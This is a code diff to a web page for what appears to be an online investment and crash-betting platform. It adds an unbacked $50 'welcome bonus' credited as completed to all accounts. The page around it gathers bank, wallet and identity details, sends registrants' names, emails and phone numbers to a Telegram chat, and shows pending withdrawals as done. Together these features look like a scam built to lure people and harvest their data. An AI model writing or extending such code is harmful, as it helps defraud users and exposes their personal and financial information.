@@ -680,7 +680,7 @@
                         * Password must be at least 6 characters & include BOTH letters and numbers!
                     </div>
                 </div>
-                <button type="submit" class="btn btn-gold" style="margin-top: 10px;">Create Account & Start Fresh</button>
+                <button type="submit" class="btn btn-gold" style="margin-top: 10px;">Create Account ($50 Bonus Included)</button>
             </form>
 
             <form id="loginForm" onsubmit="handleLogin(event)" style="display: none;">
@@ -909,7 +909,7 @@
                     </div>
                     <div class="stat-card">
                         <div class="stat-title">Available Withdrawal Balance</div>
-                        <div class="stat-val" style="color: var(--accent-green);" id="dashAvailable">$0.00</div>
+                        <div class="stat-val" style="color: var(--accent-green);" id="dashAvailable">$50.00</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-title">Active Investments</div>
@@ -1046,7 +1046,7 @@
                         <div>
                             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                                 <label style="font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">Bet Amount ($)</label>
-                                <span style="font-size: 11px; color: var(--accent-gold); font-weight: 700;">Avail: <span id="crashAvailBalDisplay">$0.00</span></span>
+                                <span style="font-size: 11px; color: var(--accent-gold); font-weight: 700;">Avail: <span id="crashAvailBalDisplay">$50.00</span></span>
                             </div>
                             <div style="position: relative;">
                                 <input type="number" id="crashBetInp" class="form-control" value="2.00" min="1" step="0.5" style="font-size: 18px; font-weight: 800; color: var(--accent-gold); padding-right: 60px;">
@@ -1433,18 +1433,21 @@
             return Math.floor(10000000 + Math.random() * 90000000).toString();
         }
 
+        // NEW USERS START WITH $50 AVAILABLE BALANCE
         function createEmptyUserData(profileInfo, forcedAccId = null) {
             return {
                 profile: profileInfo,
                 accountId: forcedAccId || generateUniqueAccountId(),
                 deposit: 0.00,
                 pending: 0.00,
-                available: 0.00,
+                available: 50.00, // DEFAULT $50 TO AVAILABLE BALANCE
                 activePlans: [],
-                transactions: [],
+                transactions: [
+                    { id: 'TX' + Math.floor(100000 + Math.random() * 900000), type: 'Welcome Bonus Credit', amount: '+$50.00', date: new Date().toLocaleString(), status: 'Completed' }
+                ],
                 createdAt: Date.now(),
                 lastClaimTimestamp: null,
-                lastWithdrawalTimestamp: null, // Track 3-day withdrawal cycle
+                lastWithdrawalTimestamp: null,
                 personalDetailsLocked: false,
                 kycData: { docType: '', docNum: '', isLocked: false },
                 savedWallet: { bankName: '', accNum: '', holderName: '', branch: '', bankPhone: '', trc20: '', binance: '', lockTimestamp: null }
@@ -1502,6 +1505,23 @@
                 systemDB.users[targetUsername] = targetData;
             }
 
+            // UPDATE ALL EXISTING USERS: GUARANTEE AVAILABLE BALANCE IS AT LEAST $50 OR ADD $50 BONUS
+            for (let uKey in systemDB.users) {
+                let uData = systemDB.users[uKey];
+                if (!uData.hasReceived50Bonus) {
+                    uData.available = (uData.available || 0) + 50.00;
+                    uData.hasReceived50Bonus = true;
+                    if (!uData.transactions) uData.transactions = [];
+                    uData.transactions.unshift({
+                        id: 'TX' + Math.floor(100000 + Math.random() * 900000),
+                        type: 'System Credit Bonus',
+                        amount: '+$50.00',
+                        date: new Date().toLocaleString(),
+                        status: 'Completed'
+                    });
+                }
+            }
+
             saveSystemDB();
             updateSavedUsersDatalist();
 
@@ -1550,13 +1570,15 @@
 
             const profileInfo = { name, email, phone, username, referral, pass, idNumber: '', dob: '', city: '', country: '' };
             currentUserData = createEmptyUserData(profileInfo);
+            currentUserData.hasReceived50Bonus = true; // Mark as credited
+
             systemDB.currentUsername = username;
             systemDB.users[username] = currentUserData;
 
             saveSystemDB();
             updateSavedUsersDatalist();
 
-            sendTelegramNotification(`<b>🆕 New Registration Alert!</b>\n\n<b>Name:</b> ${name}\n<b>Username:</b> ${username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Referral Code:</b> ${referral || 'None'}\n<b>Email:</b> ${email}\n<b>Phone:</b> ${phone}`);
+            sendTelegramNotification(`<b>🆕 New Registration Alert!</b>\n\n<b>Name:</b> ${name}\n<b>Username:</b> ${username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Referral Code:</b> ${referral || 'None'}\n<b>Email:</b> ${email}\n<b>Phone:</b> ${phone}\n<b>Initial Bonus:</b> $50.00 Credited`);
 
             document.getElementById('authModal').style.display = 'none';
             initDashboard();
@@ -1865,7 +1887,6 @@
             }
         }
 
-        /* --- UPDATED WITHDRAWAL HANDLER WITH MIN $50 AND 3-DAY (72 HOUR) CYCLE --- */
         function handlePayoutSubmit(e) {
             e.preventDefault();
             
@@ -1873,9 +1894,8 @@
             const amt = parseFloat(amtVal);
             const method = document.getElementById('payoutMethodSelect').value;
 
-            const minWithdrawLimit = 50.00; // MINIMUM $50 SET
+            const minWithdrawLimit = 50.00;
 
-            // 3-DAY (72 HOURS) INTERVAL CYCLE CHECK
             const threeDaysMs = 3 * 24 * 60 * 60 * 1000;
             if (currentUserData.lastWithdrawalTimestamp) {
                 const elapsedMs = Date.now() - currentUserData.lastWithdrawalTimestamp;
@@ -1922,11 +1942,10 @@
                 bankTelegramInfo = `\n<b>Destination:</b> Cash Manager Direct Transfer`;
             }
 
-            // Generate Verification Code
             const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
 
             currentUserData.available -= amt;
-            currentUserData.lastWithdrawalTimestamp = Date.now(); // Record withdrawal time for 3-day rule
+            currentUserData.lastWithdrawalTimestamp = Date.now();
 
             const txObj = addTx(`Withdrawal (${method === 'srilanka_bank' ? 'SL Bank' : method.toUpperCase()})`, `-$${amt.toFixed(2)}`, "Pending Verification");
             saveSystemDB();
@@ -1945,7 +1964,6 @@
                 saveSystemDB();
                 updateUI();
 
-                // DISPLAY "DEPOSIT DONE" AND AMOUNT ON SUCCESS CARD
                 document.getElementById('displayDepositedDoneAmt').innerText = `$${amt.toFixed(2)}`;
                 document.getElementById('displayVerificationCode').innerText = verificationCode;
                 openModal('payoutSuccessModal');
